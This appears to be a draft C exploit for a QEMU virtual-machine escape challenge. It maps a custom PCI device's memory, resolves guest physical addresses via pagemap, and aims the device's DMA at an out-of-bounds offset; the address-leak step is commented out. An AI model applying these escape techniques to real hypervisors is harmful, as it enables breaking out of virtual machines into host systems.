#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/types.h>
#include <inttypes.h>

unsigned char *mmio_mem;

#define PAGE_SIZE 0x1000

void set_off(uint32_t off){
  *(uint32_t *) (mmio_mem + 0x08) = off;
}

void set_src(uint32_t src){
  *(uint32_t *) (mmio_mem + 0x04) = src;
}

uint32_t mmio_read(uint32_t addr) {
    return *(uint32_t *)(mmio_mem + addr);
}

void cp_buf_to_src(){
  //return *(uint32_t*) (mmio_mem);
  mmio_read(0x00);
}

char cp_src_to_buf(){
  return *(uint32_t*) (mmio_mem) = 0; 
}

uint64_t gva2gpa(void* addr){
  uint64_t page = 0;

  int fd = open("/proc/self/pagemap", O_RDONLY);
  if (fd < 0) {
      fprintf(stderr, "[-] open error in gva2gpa\n");
      exit(1);
  }
  lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
  read(fd, &page, 8);
  return ((page & 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr & 0xfff);
}

int main() {
  
  int mmio_fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0",O_RDWR | O_SYNC);
  if(mmio_fd < 0){
    fprintf(stderr, "[-] open failed\n");
    exit(-1);
  }

  mmio_mem = mmap(0, PAGE_SIZE * 3, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
  if (mmio_mem == MAP_FAILED){
    fprintf(stderr, "[-] mmap failed\n");
    exit(-1);
  }
  puts("[+] mmio done!");
  
  // set huge page 
  system("sysctl vm.nr_hugepages=32");
  system("cat /proc/meminfo | grep -i huge");

  //set buff
  uint64_t* buff_gva;
  uint64_t buff_gpa;
  while(1){   //确保 buff 是一段连续的 0x2000 的内存
    buff_gva = mmap(0, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_NONBLOCK | MAP_ANONYMOUS, -1, 0);
    if (buff_gva < 0){
      fprintf(stderr, "[-] mmap failed in set buff\n");
      exit(-1);
    }
    memset(buff_gva, 0, 2 * PAGE_SIZE); // 必要！！！
    buff_gpa = gva2gpa(buff_gva);
    uint64_t buff_gpa_1000 = gva2gpa(buff_gva + PAGE_SIZE);

    if(buff_gpa + PAGE_SIZE== buff_gpa_1000)
      break;
  }
  printf("[+] buff_gva --> %p\n", (void*)buff_gva);
  printf("[+] buff_gpa --> %p\n", (void*)buff_gpa);
  puts("[+] get buff done!");
  
  set_src(buff_gpa);
  set_off(0xf0);

  uint32_t tmp2 = mmio_read((uint32_t)0);
  uint32_t tmp = mmio_read(0x4);
  printf("\ntmp = %d\n",tmp);

  //cp_buf_to_src();
  //uint64_t* mmio_addr =(uint64_t*) ((uint64_t)buff_gva+0x2000-0xf0);
  //uint64_t qemu_base = *mmio_addr;// - 0x16f3ae0;
  //uint64_t maria_addr = *(uint64_t*) ((uint64_t)mmio_addr+0x50);
  //uint64_t maria_buff_addr = maria_addr + 0xa30;
  //printf("[+] mmio_addr --> %p\n", (void*)mmio_addr);
  //printf("[+] maria_addr --> %p\n", (void*)maria_addr);
  //printf("[+] maria_buff_addr --> %p\n", (void*)maria_buff_addr);
  //printf("[+] qemu_base --> %p\n", (void*)qemu_base);

//  for(int i = 0; i < 0x400; i++){
//    printf("%p\n",buff_gva[i]);
//  }

  set_off(0xf0);
  return 0;
}
